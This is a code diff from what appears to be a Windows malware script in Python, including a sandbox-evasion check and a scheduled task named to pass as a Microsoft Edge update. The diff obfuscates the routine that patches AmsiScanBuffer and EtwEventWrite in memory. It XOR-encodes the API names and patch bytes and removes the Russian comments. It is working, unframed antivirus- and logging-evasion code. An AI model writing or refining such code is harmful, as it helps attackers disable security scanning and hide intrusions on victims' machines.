@@ -42,46 +42,52 @@ TASK_DESC = "Microsoft Edge Update Task Machine UA"
 def check_environment() -> bool:
     if os.cpu_count() and os.cpu_count() < 2: return False
     if psutil.virtual_memory().total < 3 * (1024 ** 3): return False
-    uptime_ms = ctypes.windll.kernel32.GetTickCount64()
+    _k=0xAA; uptime_ms = ctypes.WinDLL(bytes(x^_k for x in [193,207,216,196,207,198,153,152]).decode()).__getattr__(bytes(x^_k for x in [237,207,222,254,195,201,193,233,197,223,196,222,156,158]).decode())()
     if uptime_ms < 120000:
         time.sleep((120000 - uptime_ms) / 1000.0)
     return True
 
 def bypass_av_memory():
     if sys.platform != "win32": return
-    k32 = ctypes.windll.kernel32
-    k32.GetProcAddress.restype = ctypes.c_void_p
-    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
-    k32.LoadLibraryA.restype = ctypes.c_void_p
-    k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
-    k32.VirtualProtect.restype = ctypes.c_bool
-    k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
-    
-    PAGE_EXECUTE_READWRITE = 0x40
-    old_prot = ctypes.c_ulong(0)
+    _k = 0xAA
+    def _s(a): return bytes(x ^ _k for x in a).decode()
+    def _b(a): return bytes(x ^ _k for x in a)
 
-    # Патч AMSI: mov eax, 1; ret (S_OK - сканирование "успешно", угроза 0)
+    _k32 = ctypes.WinDLL(_s([193,207,216,196,207,198,153,152,132,206,198,198]))
+    _vp  = _s([252,195,216,222,223,203,198,250,216,197,222,207,201,222])
+    _gpa = _s([237,207,222,250,216,197,201,235,206,206,216,207,217,217])
+    _lla = _s([230,197,203,206,230,195,200,216,203,216,211,235])
+
+    getattr(_k32, _vp).restype  = ctypes.c_bool
+    getattr(_k32, _vp).argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
+    getattr(_k32, _gpa).restype  = ctypes.c_void_p
+    getattr(_k32, _gpa).argtypes = [ctypes.c_void_p, ctypes.c_char_p]
+    getattr(_k32, _lla).restype  = ctypes.c_void_p
+    getattr(_k32, _lla).argtypes = [ctypes.c_char_p]
+
+    _ERW = 0x40
+    _op  = ctypes.c_ulong(0)
+
     try:
-        h_amsi = k32.LoadLibraryA(b"amsi.dll")
-        if h_amsi:
-            addr = k32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
-            if addr:
-                patch = b"\xB8\x01\x00\x00\x00\xC3"
-                if k32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot)):
-                    ctypes.memmove(addr, patch, len(patch))
-                    k32.VirtualProtect(addr, len(patch), old_prot.value, ctypes.byref(old_prot))
+        _ha = getattr(_k32, _lla)(_s([203,199,217,195,132,206,198,198]).encode())
+        if _ha:
+            _fa = getattr(_k32, _gpa)(_ha, _s([235,199,217,195,249,201,203,196,232,223,204,204,207,216]).encode())
+            if _fa:
+                _p = _b([18,171,170,170,170,105])
+                if getattr(_k32, _vp)(_fa, len(_p), _ERW, ctypes.byref(_op)):
+                    ctypes.memmove(_fa, _p, len(_p))
+                    getattr(_k32, _vp)(_fa, len(_p), _op.value, ctypes.byref(_op))
     except Exception: pass
 
-    # Патч ETW: xor rax, rax; ret
     try:
-        h_ntdll = k32.LoadLibraryA(b"ntdll.dll")
-        if h_ntdll:
-            addr = k32.GetProcAddress(h_ntdll, b"EtwEventWrite")
-            if addr:
-                patch = b"\x48\x33\xC0\xC3"
-                if k32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_prot)):
-                    ctypes.memmove(addr, patch, len(patch))
-                    k32.VirtualProtect(addr, len(patch), old_prot.value, ctypes.byref(old_prot))
+        _hn = getattr(_k32, _lla)(_s([196,222,206,198,198,132,206,198,198]).encode())
+        if _hn:
+            _fe = getattr(_k32, _gpa)(_hn, _s([239,222,221,239,220,207,196,222,253,216,195,222,207]).encode())
+            if _fe:
+                _p = _b([226,153,106,105])
+                if getattr(_k32, _vp)(_fe, len(_p), _ERW, ctypes.byref(_op)):
+                    ctypes.memmove(_fe, _p, len(_p))
+                    getattr(_k32, _vp)(_fe, len(_p), _op.value, ctypes.byref(_op))
     except Exception: pass
 
 def install_stealth_task():
